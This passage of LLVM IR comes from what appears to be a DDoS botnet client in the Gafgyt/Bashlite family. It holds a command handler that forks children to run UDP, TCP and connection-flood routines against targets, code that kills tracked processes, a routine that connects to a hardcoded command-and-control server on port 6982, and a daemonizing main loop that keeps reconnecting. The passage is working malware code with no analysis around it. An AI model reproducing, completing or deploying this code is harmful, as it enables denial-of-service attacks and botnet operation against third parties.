  %41 = call i32 @close(i32 %6) #7
  call void @_exit(i32 0) #15
  unreachable
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #10

; Function Attrs: noinline nounwind uwtable
define void @acnc(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #7
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #13
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #7
  %19 = call i32 @sleep(i32 1) #7
  %20 = call i32 @close(i32 %17) #7
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getArch() local_unnamed_addr #11 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i64 0, i64 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() local_unnamed_addr #1 {
  %1 = tail call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i64 0, i64 0), i32 0) #7
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %3, label %9

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0) #7
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %3
  %7 = tail call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i64 0, i64 0), i32 0) #7
  %8 = icmp eq i32 %7, -1
  %. = select i1 %8, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.22, i64 0, i64 0)
  br label %9

; <label>:9:                                      ; preds = %6, %3, %0
  %.0 = phi i8* [ getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0), %0 ], [ getelementptr inbounds ([12 x i8], [12 x i8]* @.str.20, i64 0, i64 0), %3 ], [ %., %6 ]
  ret i8* %.0
}

; Function Attrs: nounwind
declare i32 @access(i8* nocapture readonly, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i8* @getPortz() local_unnamed_addr #1 {
  %1 = tail call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i64 0, i64 0), i32 0) #7
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %3, label %9

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i64 0, i64 0), i32 0) #7
  %5 = icmp eq i32 %4, -1
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %3
  %7 = tail call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i64 0, i64 0), i32 0) #7
  %8 = icmp eq i32 %7, -1
  %. = select i1 %8, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i64 0, i64 0)
  br label %9

; <label>:9:                                      ; preds = %6, %3, %0
  %.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i64 0, i64 0), %0 ], [ getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i64 0, i64 0), %3 ], [ %., %6 ]
  ret i8* %.0
}

; Function Attrs: noinline nounwind uwtable
define i8* @getOS() local_unnamed_addr #1 {
  %1 = tail call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.26, i64 0, i64 0), i32 0) #7
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %3, label %6

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.28, i64 0, i64 0), i32 0) #7
  %5 = icmp eq i32 %4, -1
  %. = select i1 %5, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.29, i64 0, i64 0)
  br label %6

; <label>:6:                                      ; preds = %3, %0
  %.0 = phi i8* [ getelementptr inbounds ([20 x i8], [20 x i8]* @.str.27, i64 0, i64 0), %0 ], [ %., %3 ]
  ret i8* %.0
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %.loopexit190

; <label>:6:                                      ; preds = %2
  %7 = icmp slt i32 %0, 6
  br i1 %7, label %.loopexit, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds i8*, i8** %1, i64 3
  %10 = load i8*, i8** %9, align 8
  %11 = tail call i32 @atoi(i8* %10) #14
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %.loopexit, label %13

; <label>:13:                                     ; preds = %8
  %14 = getelementptr inbounds i8*, i8** %1, i64 2
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @atoi(i8* %15) #14
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %.loopexit, label %18

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds i8*, i8** %1, i64 4
  %20 = load i8*, i8** %19, align 8
  %21 = tail call i32 @atoi(i8* %20) #14
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %.loopexit, label %23

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds i8*, i8** %1, i64 5
  %25 = load i8*, i8** %24, align 8
  %26 = tail call i32 @atoi(i8* %25) #14
  %27 = icmp eq i32 %26, -1
  %28 = icmp sgt i32 %26, 65500
  %or.cond = or i1 %27, %28
  %29 = icmp sgt i32 %21, 32
  %or.cond173 = or i1 %29, %or.cond
  br i1 %or.cond173, label %.loopexit, label %30

; <label>:30:                                     ; preds = %23
  %31 = icmp eq i32 %0, 7
  br i1 %31, label %32, label %37

; <label>:32:                                     ; preds = %30
  %33 = getelementptr inbounds i8*, i8** %1, i64 6
  %34 = load i8*, i8** %33, align 8
  %35 = tail call i32 @atoi(i8* %34) #14
  %36 = icmp slt i32 %35, 1
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32, %30
  %38 = getelementptr inbounds i8*, i8** %1, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = load i8*, i8** %14, align 8
  %41 = tail call i32 @atoi(i8* %40) #14
  %42 = load i8*, i8** %9, align 8
  %43 = tail call i32 @atoi(i8* %42) #14
  %44 = load i8*, i8** %19, align 8
  %45 = tail call i32 @atoi(i8* %44) #14
  %46 = load i8*, i8** %24, align 8
  %47 = tail call i32 @atoi(i8* %46) #14
  br i1 %31, label %48, label %52

; <label>:48:                                     ; preds = %37
  %49 = getelementptr inbounds i8*, i8** %1, i64 6
  %50 = load i8*, i8** %49, align 8
  %51 = tail call i32 @atoi(i8* %50) #14
  br label %52

; <label>:52:                                     ; preds = %37, %48
  %53 = phi i32 [ %51, %48 ], [ 10, %37 ]
  %strchr = tail call i8* @strchr(i8* %39, i32 44)
  %54 = icmp eq i8* %strchr, null
  br i1 %54, label %63, label %.preheader189.preheader

.preheader189.preheader:                          ; preds = %52
  br label %.preheader189

.preheader189:                                    ; preds = %.preheader189.preheader, %57
  %.sink = phi i8* [ null, %57 ], [ %39, %.preheader189.preheader ]
  %55 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %56 = icmp eq i8* %55, null
  br i1 %56, label %.loopexit190.loopexit, label %57

; <label>:57:                                     ; preds = %.preheader189
  %58 = tail call i32 @listFork()
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %.preheader189

; <label>:60:                                     ; preds = %57
  tail call void @audp(i8* nonnull %55, i32 %41, i32 %43, i32 %45, i32 %47, i32 %53)
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = tail call i32 @close(i32 %61) #7
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:63:                                     ; preds = %52
  %64 = tail call i32 @listFork()
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %.loopexit

; <label>:66:                                     ; preds = %63
  tail call void @audp(i8* %39, i32 %41, i32 %43, i32 %45, i32 %47, i32 %53)
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = tail call i32 @close(i32 %67) #7
  tail call void @_exit(i32 0) #15
  unreachable

.loopexit190.loopexit:                            ; preds = %.preheader189
  br label %.loopexit190

.loopexit190:                                     ; preds = %.loopexit190.loopexit, %2
  %69 = load i8*, i8** %1, align 8
  %70 = tail call i32 @strcmp(i8* %69, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.32, i64 0, i64 0)) #14
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %.loopexit188

; <label>:72:                                     ; preds = %.loopexit190
  %73 = icmp slt i32 %0, 4
  br i1 %73, label %.loopexit, label %74

; <label>:74:                                     ; preds = %72
  %75 = getelementptr inbounds i8*, i8** %1, i64 2
  %76 = load i8*, i8** %75, align 8
  %77 = tail call i32 @atoi(i8* %76) #14
  %78 = icmp slt i32 %77, 1
  br i1 %78, label %.loopexit, label %79

; <label>:79:                                     ; preds = %74
  %80 = getelementptr inbounds i8*, i8** %1, i64 3
  %81 = load i8*, i8** %80, align 8
  %82 = tail call i32 @atoi(i8* %81) #14
  %83 = icmp slt i32 %82, 1
  br i1 %83, label %.loopexit, label %84

; <label>:84:                                     ; preds = %79
  %85 = getelementptr inbounds i8*, i8** %1, i64 1
  %86 = load i8*, i8** %85, align 8
  %strchr169 = tail call i8* @strchr(i8* %86, i32 44)
  %87 = icmp eq i8* %strchr169, null
  br i1 %87, label %94, label %.preheader187.preheader

.preheader187.preheader:                          ; preds = %84
  br label %.preheader187

.preheader187:                                    ; preds = %.preheader187.preheader, %90
  %.sink174 = phi i8* [ null, %90 ], [ %86, %.preheader187.preheader ]
  %88 = tail call i8* @strtok(i8* %.sink174, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %89 = icmp eq i8* %88, null
  br i1 %89, label %.loopexit188.loopexit, label %90

; <label>:90:                                     ; preds = %.preheader187
  %91 = tail call i32 @listFork()
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %.preheader187

; <label>:93:                                     ; preds = %90
  tail call void @astd(i8* nonnull %88, i32 %77, i32 %82)
  unreachable

; <label>:94:                                     ; preds = %84
  %95 = tail call i32 @listFork()
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %.loopexit

; <label>:97:                                     ; preds = %94
  tail call void @astd(i8* %86, i32 %77, i32 %82)
  unreachable

.loopexit188.loopexit:                            ; preds = %.preheader187
  br label %.loopexit188

.loopexit188:                                     ; preds = %.loopexit188.loopexit, %.loopexit190
  %98 = load i8*, i8** %1, align 8
  %99 = tail call i32 @strcmp(i8* %98, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.33, i64 0, i64 0)) #14
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %.loopexit186

; <label>:101:                                    ; preds = %.loopexit188
  %102 = icmp slt i32 %0, 6
  br i1 %102, label %.loopexit, label %103

; <label>:103:                                    ; preds = %101
  %104 = getelementptr inbounds i8*, i8** %1, i64 3
  %105 = load i8*, i8** %104, align 8
  %106 = tail call i32 @atoi(i8* %105) #14
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %.loopexit, label %108

; <label>:108:                                    ; preds = %103
  %109 = getelementptr inbounds i8*, i8** %1, i64 2
  %110 = load i8*, i8** %109, align 8
  %111 = tail call i32 @atoi(i8* %110) #14
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %.loopexit, label %113

; <label>:113:                                    ; preds = %108
  %114 = getelementptr inbounds i8*, i8** %1, i64 4
  %115 = load i8*, i8** %114, align 8
  %116 = tail call i32 @atoi(i8* %115) #14
  %117 = icmp eq i32 %116, -1
  %118 = icmp sgt i32 %116, 32
  %or.cond175 = or i1 %117, %118
  br i1 %or.cond175, label %.loopexit, label %119

; <label>:119:                                    ; preds = %113
  %120 = icmp sgt i32 %0, 6
  br i1 %120, label %121, label %.thread

; <label>:121:                                    ; preds = %119
  %122 = getelementptr inbounds i8*, i8** %1, i64 6
  %123 = load i8*, i8** %122, align 8
  %124 = tail call i32 @atoi(i8* %123) #14
  %125 = icmp slt i32 %124, 0
  br i1 %125, label %.loopexit, label %126

; <label>:126:                                    ; preds = %121
  %127 = icmp eq i32 %0, 8
  br i1 %127, label %128, label %.thread

; <label>:128:                                    ; preds = %126
  %129 = getelementptr inbounds i8*, i8** %1, i64 7
  %130 = load i8*, i8** %129, align 8
  %131 = tail call i32 @atoi(i8* %130) #14
  %132 = icmp slt i32 %131, 1
  br i1 %132, label %.loopexit, label %.thread

.thread:                                          ; preds = %119, %128, %126
  %133 = phi i1 [ true, %128 ], [ false, %126 ], [ false, %119 ]
  %134 = getelementptr inbounds i8*, i8** %1, i64 1
  %135 = load i8*, i8** %134, align 8
  %136 = load i8*, i8** %109, align 8
  %137 = tail call i32 @atoi(i8* %136) #14
  %138 = load i8*, i8** %104, align 8
  %139 = tail call i32 @atoi(i8* %138) #14
  %140 = load i8*, i8** %114, align 8
  %141 = tail call i32 @atoi(i8* %140) #14
  %142 = getelementptr inbounds i8*, i8** %1, i64 5
  %143 = load i8*, i8** %142, align 8
  br i1 %133, label %144, label %148

; <label>:144:                                    ; preds = %.thread
  %145 = getelementptr inbounds i8*, i8** %1, i64 7
  %146 = load i8*, i8** %145, align 8
  %147 = tail call i32 @atoi(i8* %146) #14
  br label %148

; <label>:148:                                    ; preds = %.thread, %144
  %149 = phi i32 [ %147, %144 ], [ 10, %.thread ]
  br i1 %120, label %150, label %154

; <label>:150:                                    ; preds = %148
  %151 = getelementptr inbounds i8*, i8** %1, i64 6
  %152 = load i8*, i8** %151, align 8
  %153 = tail call i32 @atoi(i8* %152) #14
  br label %154

; <label>:154:                                    ; preds = %148, %150
  %155 = phi i32 [ %153, %150 ], [ 0, %148 ]
  %strchr170 = tail call i8* @strchr(i8* %135, i32 44)
  %156 = icmp eq i8* %strchr170, null
  br i1 %156, label %165, label %.preheader185.preheader

.preheader185.preheader:                          ; preds = %154
  br label %.preheader185

.preheader185:                                    ; preds = %.preheader185.preheader, %159
  %.sink176 = phi i8* [ null, %159 ], [ %135, %.preheader185.preheader ]
  %157 = tail call i8* @strtok(i8* %.sink176, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %158 = icmp eq i8* %157, null
  br i1 %158, label %.loopexit186.loopexit, label %159

; <label>:159:                                    ; preds = %.preheader185
  %160 = tail call i32 @listFork()
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %162, label %.preheader185

; <label>:162:                                    ; preds = %159
  tail call void @atcp(i8* nonnull %157, i32 %137, i32 %139, i32 %141, i8* %143, i32 %155, i32 %149)
  %163 = load i32, i32* @mainCommSock, align 4
  %164 = tail call i32 @close(i32 %163) #7
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:165:                                    ; preds = %154
  %166 = tail call i32 @listFork()
  %167 = icmp eq i32 %166, 0
  br i1 %167, label %168, label %.loopexit

; <label>:168:                                    ; preds = %165
  %169 = load i32, i32* @mainCommSock, align 4
  %170 = load i8*, i8** %134, align 8
  %171 = load i8*, i8** %109, align 8
  %172 = tail call i32 @atoi(i8* %171) #14
  %173 = load i8*, i8** %104, align 8
  %174 = tail call i32 @atoi(i8* %173) #14
  %175 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %169, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.34, i64 0, i64 0), i8* %170, i32 %172, i32 %174)
  tail call void @atcp(i8* %135, i32 %137, i32 %139, i32 %141, i8* %143, i32 %155, i32 %149)
  %176 = load i32, i32* @mainCommSock, align 4
  %177 = tail call i32 @close(i32 %176) #7
  tail call void @_exit(i32 0) #15
  unreachable

.loopexit186.loopexit:                            ; preds = %.preheader185
  br label %.loopexit186

.loopexit186:                                     ; preds = %.loopexit186.loopexit, %.loopexit188
  %178 = load i8*, i8** %1, align 8
  %179 = tail call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %181, label %.loopexit184

; <label>:181:                                    ; preds = %.loopexit186
  %182 = icmp slt i32 %0, 6
  br i1 %182, label %.loopexit, label %183

; <label>:183:                                    ; preds = %181
  %184 = getelementptr inbounds i8*, i8** %1, i64 3
  %185 = load i8*, i8** %184, align 8
  %186 = tail call i32 @atoi(i8* %185) #14
  %187 = icmp eq i32 %186, -1
  br i1 %187, label %.loopexit, label %188

; <label>:188:                                    ; preds = %183
  %189 = getelementptr inbounds i8*, i8** %1, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = tail call i32 @atoi(i8* %190) #14
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %.loopexit, label %193

; <label>:193:                                    ; preds = %188
  %194 = getelementptr inbounds i8*, i8** %1, i64 4
  %195 = load i8*, i8** %194, align 8
  %196 = tail call i32 @atoi(i8* %195) #14
  %197 = icmp eq i32 %196, -1
  %198 = icmp sgt i32 %196, 32
  %or.cond177 = or i1 %197, %198
  br i1 %or.cond177, label %.loopexit, label %199

; <label>:199:                                    ; preds = %193
  %200 = icmp sgt i32 %0, 6
  br i1 %200, label %201, label %.thread180

; <label>:201:                                    ; preds = %199
  %202 = getelementptr inbounds i8*, i8** %1, i64 6
  %203 = load i8*, i8** %202, align 8
  %204 = tail call i32 @atoi(i8* %203) #14
  %205 = icmp slt i32 %204, 0
  br i1 %205, label %.loopexit, label %206

; <label>:206:                                    ; preds = %201
  %207 = icmp eq i32 %0, 8
  br i1 %207, label %208, label %.thread180

; <label>:208:                                    ; preds = %206
  %209 = getelementptr inbounds i8*, i8** %1, i64 7
  %210 = load i8*, i8** %209, align 8
  %211 = tail call i32 @atoi(i8* %210) #14
  %212 = icmp slt i32 %211, 1
  br i1 %212, label %.loopexit, label %.thread180

.thread180:                                       ; preds = %199, %208, %206
  %213 = getelementptr inbounds i8*, i8** %1, i64 1
  %214 = load i8*, i8** %213, align 8
  %215 = load i8*, i8** %189, align 8
  %216 = tail call i32 @atoi(i8* %215) #14
  %217 = load i8*, i8** %184, align 8
  %218 = tail call i32 @atoi(i8* %217) #14
  %strchr171 = tail call i8* @strchr(i8* %214, i32 44)
  %219 = icmp eq i8* %strchr171, null
  br i1 %219, label %226, label %.preheader183.preheader

.preheader183.preheader:                          ; preds = %.thread180
  br label %.preheader183

.preheader183:                                    ; preds = %.preheader183.preheader, %222
  %.sink178 = phi i8* [ null, %222 ], [ %214, %.preheader183.preheader ]
  %220 = tail call i8* @strtok(i8* %.sink178, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %221 = icmp eq i8* %220, null
  br i1 %221, label %.loopexit184.loopexit, label %222

; <label>:222:                                    ; preds = %.preheader183
  %223 = tail call i32 @listFork()
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %.preheader183

; <label>:225:                                    ; preds = %222
  tail call void @astd(i8* %214, i32 %216, i32 %218)
  unreachable

; <label>:226:                                    ; preds = %.thread180
  %227 = tail call i32 @listFork()
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %.loopexit

; <label>:229:                                    ; preds = %226
  tail call void @astd(i8* %214, i32 %216, i32 %218)
  unreachable

.loopexit184.loopexit:                            ; preds = %.preheader183
  br label %.loopexit184

.loopexit184:                                     ; preds = %.loopexit184.loopexit, %.loopexit186
  %230 = load i8*, i8** %1, align 8
  %231 = tail call i32 @strcmp(i8* %230, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.36, i64 0, i64 0)) #14
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %233, label %.loopexit182

; <label>:233:                                    ; preds = %.loopexit184
  %234 = icmp slt i32 %0, 4
  br i1 %234, label %.loopexit, label %235

; <label>:235:                                    ; preds = %233
  %236 = getelementptr inbounds i8*, i8** %1, i64 2
  %237 = load i8*, i8** %236, align 8
  %238 = tail call i32 @atoi(i8* %237) #14
  %239 = icmp slt i32 %238, 1
  br i1 %239, label %.loopexit, label %240

; <label>:240:                                    ; preds = %235
  %241 = getelementptr inbounds i8*, i8** %1, i64 3
  %242 = load i8*, i8** %241, align 8
  %243 = tail call i32 @atoi(i8* %242) #14
  %244 = icmp slt i32 %243, 1
  br i1 %244, label %.loopexit, label %245

; <label>:245:                                    ; preds = %240
  %246 = getelementptr inbounds i8*, i8** %1, i64 1
  %247 = load i8*, i8** %246, align 8
  %strchr172 = tail call i8* @strchr(i8* %247, i32 44)
  %248 = icmp eq i8* %strchr172, null
  br i1 %248, label %257, label %.preheader181.preheader

.preheader181.preheader:                          ; preds = %245
  br label %.preheader181

.preheader181:                                    ; preds = %.preheader181.preheader, %251
  %.sink179 = phi i8* [ null, %251 ], [ %247, %.preheader181.preheader ]
  %249 = tail call i8* @strtok(i8* %.sink179, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %250 = icmp eq i8* %249, null
  br i1 %250, label %.loopexit182.loopexit, label %251

; <label>:251:                                    ; preds = %.preheader181
  %252 = tail call i32 @listFork()
  %253 = icmp eq i32 %252, 0
  br i1 %253, label %254, label %.preheader181

; <label>:254:                                    ; preds = %251
  tail call void @acnc(i8* nonnull %249, i32 %238, i32 %243)
  %255 = load i32, i32* @mainCommSock, align 4
  %256 = tail call i32 @close(i32 %255) #7
  tail call void @_exit(i32 0) #15
  unreachable

; <label>:257:                                    ; preds = %245
  %258 = tail call i32 @listFork()
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %.loopexit

; <label>:260:                                    ; preds = %257
  tail call void @acnc(i8* %247, i32 %238, i32 %243)
  tail call void @_exit(i32 0) #15
  unreachable

.loopexit182.loopexit:                            ; preds = %.preheader181
  br label %.loopexit182

.loopexit182:                                     ; preds = %.loopexit182.loopexit, %.loopexit184
  %261 = load i8*, i8** %1, align 8
  %262 = tail call i32 @strcmp(i8* %261, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0)) #14
  %263 = icmp eq i32 %262, 0
  %264 = load i64, i64* @numpids, align 8
  %265 = icmp ne i64 %264, 0
  %or.cond198 = and i1 %263, %265
  br i1 %or.cond198, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit182
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %278
  %.0196 = phi i64 [ %279, %278 ], [ 0, %.lr.ph.preheader ]
  %266 = load i32*, i32** @pids, align 8
  %267 = getelementptr inbounds i32, i32* %266, i64 %.0196
  %268 = load i32, i32* %267, align 4
  %269 = icmp eq i32 %268, 0
  br i1 %269, label %278, label %270

; <label>:270:                                    ; preds = %.lr.ph
  %271 = tail call i32 @getpid() #7
  %272 = icmp eq i32 %268, %271
  br i1 %272, label %278, label %273

; <label>:273:                                    ; preds = %270
  %274 = load i32*, i32** @pids, align 8
  %275 = getelementptr inbounds i32, i32* %274, i64 %.0196
  %276 = load i32, i32* %275, align 4
  %277 = tail call i32 @kill(i32 %276, i32 9) #7
  br label %278

; <label>:278:                                    ; preds = %270, %.lr.ph, %273
  %279 = add i64 %.0196, 1
  %280 = load i64, i64* @numpids, align 8
  %281 = icmp ult i64 %279, %280
  br i1 %281, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %278
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit182, %257, %226, %165, %94, %63, %233, %235, %240, %181, %183, %188, %193, %201, %208, %101, %103, %108, %113, %121, %128, %72, %74, %79, %6, %8, %13, %18, %23, %32
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [512 x i8], align 16
  %2 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 512, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #7
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #7
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #14
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 6982, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #6

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #9 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [10 x i8*], align 16
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %7 = tail call i32 @getpid() #7
  %8 = xor i32 %7, %6
  tail call void @srand(i32 %8) #7
  %9 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %10 = tail call i32 @getpid() #7
  %11 = xor i32 %10, %9
  tail call void @init_rand(i32 %11)
  %12 = tail call i32 @getOurIP()
  %13 = tail call i32 @fork() #7
  %14 = icmp eq i32 %13, 0
  br i1 %14, label %17, label %15

; <label>:15:                                     ; preds = %2
  %16 = call i32 @waitpid(i32 %13, i32* nonnull %3, i32 0) #7
  call void @exit(i32 0) #15
  unreachable

; <label>:17:                                     ; preds = %2
  %18 = tail call i32 @fork() #7
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  tail call void @exit(i32 0) #15
  unreachable

; <label>:21:                                     ; preds = %17
  %22 = tail call i32 @setsid() #7
  %23 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i64 0, i64 0)) #7
  %24 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %27 = getelementptr inbounds [10 x i8*], [10 x i8*]* %5, i64 0, i64 0
  br label %.backedge72

.backedge72.loopexit:                             ; preds = %.backedge
  br label %.backedge72.backedge

.backedge72:                                      ; preds = %.backedge72.backedge, %21
  %28 = call i32 @initConnection()
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %32, label %30

